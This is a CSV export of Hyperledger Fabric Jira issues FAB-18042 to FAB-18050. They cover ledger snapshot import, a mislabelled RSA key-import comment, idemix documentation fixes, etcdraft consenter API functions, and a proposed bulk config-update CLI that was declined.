Implement import data function for stateleveldb to enable loading of a channel data from a snapshot,FAB-18042,45515,44706,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,02/Jul/20 12:21 AM,07/Jul/20 5:07 AM,28/Oct/23 3:10 AM,07/Jul/20 5:03 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e3v:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jul/20 12:56 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1516;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The description of RSAGoPublicKeyImportOpts in the opts file is incorrect,FAB-18043,45518,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Low,,xiongweigang,xiongweigang,xiongweigang,02/Jul/20 12:41 PM,02/Jul/20 6:44 PM,28/Oct/23 3:10 AM,,v1.4.0,,,,,,,,,,,,,fabric-crypto,,,,,,,,,0,quality,,,,,"The description of RSAGoPublicKeyImportOpts in the opts file is incorrect

 In line 292 of the Fabric/BCCSP/opts.go file:

// ECDSAGoPublicKeyImportOpts contains options for RSA key importation from rsa.PublicKey
type RSAGoPublicKeyImportOpts struct {
 Temporary bool
}

The ""ECDSAGoPublicKeyImportOpts"" should be  ""RSAGoPublicKeyImportOpts""",,xiongweigang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e43:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),xiongweigang,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
tidy uncessary convertation ,FAB-18044,45521,,Task,Backlog,FAB,Fabric,software,denyeart,,,Low,,,manxiaqu,manxiaqu,02/Jul/20 6:30 PM,02/Jul/20 6:30 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The `raw.([]byte)` in [https://github.com/hyperledger/fabric/blob/master/bccsp/idemix/handlers/revocation.go#L153] is not necessary, The raw interface has converted to `[]byte` before, and `der` is the result, I think using `der` directly is just fine.",,manxiaqu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e4r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manxiaqu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add temporary files to indicate a channel's block store is under deletion,FAB-18045,45534,,Task,To Do,FAB,Fabric,software,denyeart,,,Medium,,,wenjian,wenjian,02/Jul/20 11:59 PM,09/Nov/20 11:17 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"When removing ledger data for a channel, if the remove fails or the orderer/peer crashes, the ledger dbs may have inconsistent data and cause unknown behavior.

Although the higher level above ledger may handle failure recovery, it is important for ledger to mark the channel is under deletion so that it cannot be opened/used. This sub-task will take care of the block store, where a temporary file may be added to mark it under deletion.  ",,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0k",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation for Identity Mixer align with code change,FAB-18046,45544,,Documentation,In Progress,FAB,Fabric,software,denyeart,,,Low,,davidkhala,davidkhala,davidkhala,03/Jul/20 8:11 PM,03/Jul/20 8:33 PM,28/Oct/23 3:10 AM,,v2.x,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"This aims to keep track a series of my findings in problematic idemix document. 
- User should rename the file `IssuerRevocationPublicKey` copied from fabric-ca to be `RevocationPublicKey` to local peer org directory. 
** Otherwise later when we use configtxgen to `outputBlock` will have `msp/RevocationPublicKey: no such file or directory`
** The stackTrace:
{code:java}
Error on outputBlock: could not create bootstrapper: could not create channel group: could not create consortiums group: failed to create consortium SampleConsortium: failed to create consortium org: 1 - Error loading MSP configuration for org:........msp/RevocationPublicKey: no such file or directory
{code}



",,davidkhala,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-9919,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e9f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),davidkhala,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function that removes KafkaBrokers value,FAB-18047,45560,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,06/Jul/20 10:39 PM,10/Jul/20 4:56 AM,28/Oct/23 3:10 AM,10/Jul/20 4:56 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API I would like to call a function during my migration from Kafka to EtcdRaft to remove the KafkaBrokers section from my config.

The KafkaBrokers section should normally not be used if the consenter type is etcdraft but this function enables us to support cleaning up migrated configs.

*Acceptance*

I can call a function to entirely remove KafkaBrokers similar to the API function for removing top level orderer addresses. As example is also added/improved for demonstrating how to migrate from Kafka to EtcdRaft.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzzr",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jul/20 11:45 PM;tsharris;[https://github.com/hyperledger/fabric-config/pull/33];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function for adding/removing consenters from an etcdraft orderer configuration,FAB-18048,45561,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,06/Jul/20 10:43 PM,09/Jul/20 3:35 AM,28/Oct/23 3:10 AM,09/Jul/20 3:35 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to call a function for quickly adding or removing consenters from the consenter set of an etcdraft orderer configuration. Currently this is already achievable via fetching the entire orderer configuration and setting a new orderer configuration with the consenters updated, but the addition of these API functions will reduce the need for overriding the entire orderer configuration. Note: removal should match all 4 fields (host port and both certs) to be safe.

*Acceptance*

I can call functions to add and remove consenters from an etcdraft orderer configuration similar to how I can do so for orderer endpoints of an orderer org and anchor peers of application orgs.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzzs",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jul/20 2:18 AM;tsharris;[https://github.com/hyperledger/fabric-config/pull/32];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement a config transaction bulk operation CLI tool,FAB-18049,45562,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,caod,caod,06/Jul/20 10:50 PM,09/Jul/20 12:09 AM,28/Oct/23 3:10 AM,09/Jul/20 12:09 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,operator,,,,"As a user with a network of many channels, I would like to perform bulk operations on a subset of channels with a CLI tool that consumes the fabric-config library.

 

Some initial bulk operations we'd like supported include:

*Cert Expiry*
 Update channel MSP that only requires one signature
 TLS certs for orderers in consenter set

*V1 to V2 migration*
 Remove dead consenter from channel
 Remove dead anchor peers
 Add anchor peers

 

Requirements:
* Option to run the tool in dry-run mode - show the calculated update
* error message when doing any operation other than the supported ones
* stack multiple operations
 
Use cases:
REPLACE: Update channel MSP - admins
DELETE: Remove dead consenter from channel
UPDATE: TLS certs for orderers in consenter set
ADD: Anchor Peer
DELETE: Anchor Peer
 
Connection Profile: Use Fabric connection profile format
[https://hyperledger-fabric.readthedocs.io/en/release-2.0/developapps/connectionprofile.html]
{code:java}
Add/Remove/Delete consenter:
[
  {
    operation: ""addConsenter|removeConsenter|updateConsenter|replaceConsenter"",
    identifier: {
      ""host"": ""peer0.org1.example.com"",
      ""port"": 7051,
    }
    value: [
      {
        ""client_tls_cert"": <>,
        ""server_tls_cert"": <>
      }
    ]
  }
]

Update MSP:
[
  {
    operation: ""updateApplicationMSP|updateOrdererMSP"",
    org: ""Org1MSP"",
    value: {
      admins: [<base64encoded certs>],
    }
  }
]

update anchor peer:
[
  {
    operation: ""removeAnchorPeers|addAnchorPeers|replaceAnchorPeers"",
    org: ""Org1MSP"",
    value: [
      {
        ""host"": ""peer0.org1.example.com"",
        ""port"": 7051
      }
    ]
  }
]

----
batchUpdate.json
{
  channelList: [
    ""channel1"",
    ""channel2""
  ],
  operations: [
    {
      operation: ""removeAnchorPeers"",
      org: ""Org1MSP"",
      value: [
        {
          ""host"": ""peer0.org1.example.com"",
          ""port"": 7051
        }
      ]
    },
    {
      operation: ""updateApplicationMSP"",
      org: ""Org1MSP"",
      value: {
        admins: [base64],
      }
    }
  ]
}

connectionProfile.json - with peers (and orderers?) depending on service discoveryidentity.json

signingIdentities.json
{
  signatures: [
    {
      mspId: ""Org1MSP"",
      privateKey: <base64>,
      certificate: <LS....>
    },
    {
      mspId: ""Org2MSP"",
      privateKey: <base64>,
      certificate: <LS....>
    },
    {
      mspId: ""OrdererMSP"",
      privateKey: <base64>,
      certificate: <LS....>
    }
  ]
}{code}

Support a --dryrun flag that prints the update to stdout and can be redirected to a file
 

The tool will take a JSON input indicating the update that also specifies a connection profile for connecting to a peer to use the discovery service for fetching config blocks. The tool should both support fetching the config block via the information provided in the connection profile as well as submitting the config update transaction

 

*Acceptance*

I can use the cli tool to update a network with many channels by performing the same config update operations on a selected list of channels for the network. I can pass signing identities and a connection profile for connecting to a peer for fetching config blocks and submitting transactions to the orderer. An example command should look something like:
{code:java}
configtx update batchUpdate.json --connectionProfile connectionProfile.json --signingIdentities signatures.json --dryrun{code}",,caod,denyeart,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzzz9",,,,Unset,Unset,,(Please add steps to reproduce),5.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jul/20 11:13 PM;wlahti;A few golang references for connection profile usage:

- [https://github.com/hyperledger/fabric/blob/master/internal/peer/common/networkconfig.go] has the network config struct that the peer CLI reads a connection profile into.

- [https://github.com/hyperledger/fabric/blob/master/internal/peer/lifecycle/chaincode/testdata/connectionprofile.yaml] is an example of a valid connection profile.;;;","09/Jul/20 12:09 AM;denyeart;This sounds like a utility that an operator may want to implement using the existing Fabric config library. I wouldn't expect the Fabric project to actually deliver such a utility. Therefore I'll close the Jira issue for now. If there are specific gaps in Fabric project that need to be filled in order to create such a utility (e.g. extensions to the config library), then we can open separate Jira items for those.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bootstrap statedb from snapshot files,FAB-18050,45563,44706,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,07/Jul/20 5:08 AM,11/Jul/20 7:25 AM,28/Oct/23 3:10 AM,11/Jul/20 7:25 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ecr:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Jul/20 5:09 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1542;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
